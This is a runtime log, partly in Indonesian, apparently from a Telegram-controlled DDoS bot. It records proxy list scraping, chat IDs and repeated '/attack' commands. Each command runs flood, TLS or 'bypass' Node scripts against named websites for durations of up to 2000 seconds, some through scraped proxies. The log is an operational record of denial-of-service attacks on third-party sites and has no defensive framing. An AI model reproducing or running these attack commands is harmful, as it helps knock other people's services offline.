[2024-08-26T07:39:04.205Z] Proxies successfully scraped and saved to proxy.txt
[2024-08-26T07:44:29.204Z] proxy.txt lama berhasil dihapus
[2024-08-26T07:44:35.522Z] Sent /start message to chat 7274889807
[2024-08-26T07:44:38.621Z] Proxies successfully scraped and saved to proxy.txt
[2024-08-26T07:49:28.775Z] Received /stress command from chat 7274889807. Executing: undefined
[2024-08-26T07:50:30.260Z] Received /attack command from chat 7274889807. Executing: node methods/flood.js https://tatakae.raikyxzprivate.my.id 120
[2024-08-26T07:52:31.852Z] Command executed successfully for chat 7274889807. Output: Attack stopped.

[2024-08-26T07:53:30.364Z] Received /attack command from chat 7274889807. Executing: node methods/flood.js https://tatakae.raikyxzprivate.my.id 120
[2024-08-26T07:55:31.265Z] Command executed successfully for chat 7274889807. Output: Attack stopped.

[2024-08-26T07:56:10.275Z] Received /attack command from chat 7274889807. Executing: node methods/flood.js https://tatakae.raikyxzprivate.my.id 1200
[2024-08-26T14:15:46.642Z] proxy.txt lama berhasil dihapus
[2024-08-26T14:15:55.291Z] Proxies successfully scraped and saved to proxy.txt
[2024-08-26T14:16:03.588Z] Sent /start message to chat 7274889807
[2024-08-26T14:17:02.521Z] Received /attack command from chat 7274889807. Executing: node methods/flood.js https://tatakae.raikyxzprivate.my.id 2000
[2024-08-26T14:50:23.233Z] Command executed successfully for chat 7274889807. Output: Attack stopped.

[2024-08-26T14:52:49.649Z] Received /attack command from chat 7274889807. Executing: node methods/tls.js https://servverpublic.ibzz-officiall.online 1300 100 10
[2024-08-26T14:52:55.591Z] Sent /method message to chat 7274889807
[2024-08-26T14:57:25.903Z] proxy.txt lama berhasil dihapus
[2024-08-26T14:57:27.337Z] Sent /method message to chat 7274889807
[2024-08-26T14:57:35.990Z] Proxies successfully scraped and saved to proxy.txt
[2024-08-26T14:57:59.315Z] Received /attack command from chat 7274889807. Executing: node methods/bypass.js https://servverpublic.ibzz-officiall.online 2000 100 10 proxy.txt
[2024-08-27T10:20:13.115Z] proxy.txt lama berhasil dihapus
[2024-08-27T10:20:21.670Z] Proxies successfully scraped and saved to proxy.txt
[2024-08-27T10:20:27.492Z] Sent /start message to chat 7274889807
[2024-08-27T10:21:15.884Z] Received /attack command from chat 7274889807. Executing: node methods/flood.js https://tatakae.raikyxzprivate.my.id 1200
[2024-08-27T15:59:12.020Z] proxy.txt lama berhasil dihapus
[2024-08-27T15:59:21.796Z] Proxies successfully scraped and saved to proxy.txt
[2024-08-27T16:06:10.271Z] Sent /start message to chat 7274889807
[2024-08-27T16:06:21.351Z] Received /attack command from chat 7274889807. Executing: node methods/bypass.js https://siikomik.com 130 100 10 proxy.txt
[2024-08-28T09:47:36.656Z] proxy.txt lama berhasil dihapus
[2024-08-28T09:47:45.202Z] Proxies successfully scraped and saved to proxy.txt
[2024-08-29T06:29:20.614Z] proxy.txt lama berhasil dihapus
[2024-08-29T06:29:29.115Z] Proxies successfully scraped and saved to proxy.txt
[2024-08-29T06:30:41.109Z] Received /attack command from chat 7274889807. Executing: node methods/flood.js https://ntooxajz.pannel-ku.xyz 120
[2024-08-29T06:32:41.992Z] Command executed successfully for chat 7274889807. Output: Attack stopped.

[2024-08-29T06:33:50.475Z] Received /attack command from chat 7274889807. Executing: node methods/flood.js https://ntooxajz.pannel-ku.xyz 1200
[2024-08-29T06:39:51.558Z] proxy.txt lama berhasil dihapus
[2024-08-29T06:40:00.965Z] Proxies successfully scraped and saved to proxy.txt
[2024-08-29T06:42:37.552Z] Sent /start message to chat 6579006602
[2024-08-29T06:45:20.475Z] Sent /start message to chat 7407325378
[2024-08-29T06:45:39.048Z] Sent /method message to chat 7407325378
[2024-08-29T14:26:53.219Z] proxy.txt lama berhasil dihapus
[2024-08-29T14:27:02.858Z] Proxies successfully scraped and saved to proxy.txt
[2024-08-30T07:41:02.857Z] proxy.txt lama berhasil dihapus
[2024-08-30T07:41:14.285Z] Proxies successfully scraped and saved to proxy.txt
[2024-08-30T07:41:20.733Z] Sent /start message to chat 7274889807
[2024-08-30T07:41:33.197Z] Received /attack command from chat 7274889807. Executing: node methods/flood.js https://langgantengsangat.flixxoffc.my.id 1200
